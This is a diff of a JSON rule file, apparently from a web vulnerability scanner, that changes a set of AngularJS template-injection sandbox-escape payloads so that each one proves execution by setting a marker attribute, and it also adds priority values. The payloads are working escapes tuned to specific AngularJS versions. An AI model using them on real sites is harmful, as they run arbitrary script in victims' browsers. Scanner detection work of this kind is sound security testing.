@@ -1862,7 +1862,7 @@
             "expression_1_2_27_to_1_3_20": "angularjs/(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b",
             "expression_1_4_2_to_1_5_8": "angularjs/(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b"
           },
-          "proofChannel": "postMessage string marker ptk-xss:<markerToken>"
+          "proofChannel": "DOM execution marker attribute data-ptk-xss=<markerToken>"
         },
         "extensions": {},
         "presentation": {
@@ -1900,7 +1900,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+                "value": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -1957,14 +1957,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-101-115",
-              "payload": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+              "payload": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -2036,7 +2037,7 @@
                   "query",
                   "form"
                 ],
-                "value": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()",
+                "value": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2093,14 +2094,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-101-115",
-              "payload": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()",
+              "payload": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -2134,7 +2136,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{$on.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+                "value": "{{$on.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2191,14 +2193,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-rs-101-115",
-              "payload": "{{$on.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+              "payload": "{{$on.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "on-constructor"
+              "payloadFamily": "on-constructor",
+              "selectorPriorityBoost": 1000
             }
           }
         },
@@ -2232,7 +2235,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49),String.fromCharCode(42))')()}}",
+                "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2289,14 +2292,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-120-121",
-              "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49),String.fromCharCode(42))')()}}",
+              "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:0|1)\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:0|1)\\b|1\\.2\\.(?:0|1)\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:0|1)\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:0|1)\\b",
               "versionRange": "reflected-1-2-0-to-1-2-1",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "sub-call-get-own-property-descriptor"
+              "payloadFamily": "sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2432,7 +2436,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sub-call-get-own-property-descriptor-dom-marker"
+              "payloadFamily": "sub-call-get-own-property-descriptor-dom-marker",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2466,7 +2471,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53),String.fromCharCode(42))//\"}}",
+                "value": "{{{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53))//\"}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2523,14 +2528,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-122-125",
-              "payload": "{{{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53),String.fromCharCode(42))//\"}}",
+              "payload": "{{{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53))//\"}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[2-5])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[2-5])\\b|1\\.2\\.(?:[2-5])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[2-5])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[2-5])\\b",
               "versionRange": "reflected-1-2-2-to-1-2-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout"
+              "payloadFamily": "parser-breakout",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -2564,7 +2570,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()}}",
+                "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2621,14 +2627,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-126-1218",
-              "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()}}",
+              "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[6-9]|1[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b|1\\.2\\.(?:[6-9]|1[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[6-9]|1[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b",
               "versionRange": "reflected-1-2-6-to-1-2-18",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "proto-sub-call-get-own-property-descriptor"
+              "payloadFamily": "proto-sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2700,7 +2707,7 @@
                   "query",
                   "form"
                 ],
-                "value": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()",
+                "value": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2757,14 +2764,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-126-1218",
-              "payload": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()",
+              "payload": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[6-9]|1[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b|1\\.2\\.(?:[6-9]|1[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[6-9]|1[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b",
               "versionRange": "reflected-1-2-6-to-1-2-18",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "proto-sub-call-get-own-property-descriptor"
+              "payloadFamily": "proto-sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2798,7 +2806,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)}}",
+                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2855,14 +2863,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-1219-1223",
-              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)}}",
+              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "sort-function-constructor"
+              "payloadFamily": "sort-function-constructor",
+              "selectorPriorityBoost": 1350
             }
           }
         },
@@ -2934,7 +2943,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2991,14 +3000,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sort-function-constructor"
+              "payloadFamily": "sort-function-constructor",
+              "selectorPriorityBoost": 1350
             }
           }
         },
@@ -3070,7 +3080,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))','a'].sort(toString.constructor);",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3128,14 +3138,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-sq-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))','a'].sort(toString.constructor);",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sort-constructor-single-quote"
+              "payloadFamily": "sort-constructor-single-quote",
+              "selectorPriorityBoost": 1500
             }
           }
         },
@@ -3233,7 +3244,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout-window-name"
+              "payloadFamily": "parser-breakout-window-name",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3369,7 +3381,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout-window-name"
+              "payloadFamily": "parser-breakout-window-name",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3441,7 +3454,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48),String.fromCharCode(42))//\";",
+                "value": "{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48))//\";",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3498,14 +3511,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-1227-1320",
-              "payload": "{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48),String.fromCharCode(42))//\";",
+              "payload": "{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48))//\";",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b",
               "versionRange": "expression-1-2-27-to-1-3-20",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout"
+              "payloadFamily": "parser-breakout",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3603,7 +3617,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode",
+              "selectorPriorityBoost": 1160
             }
           }
         },
@@ -3637,7 +3652,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');}}",
+                "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57))//');}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3695,14 +3710,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-eval-140-149",
-              "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');}}",
+              "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57))//');}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -3715,7 +3731,7 @@
             "config": {
               "browserNav": {
                 "checks": [
-                  "dom_xss"
+                  "template_marker"
                 ],
                 "markerToken": "ptk-ng-rh-140-149",
                 "settleMs": 1200,
@@ -3736,7 +3752,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
+                "value": "&#123;&#123;'ptk-ng-'+'rh-140-149'&#125;&#125;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3746,13 +3762,13 @@
             "rule": {
               "or": [
                 {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
+                  "var": "attack.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
+                  "var": "attack.runtime.browserNav.template_marker.vulnerable"
                 },
                 {
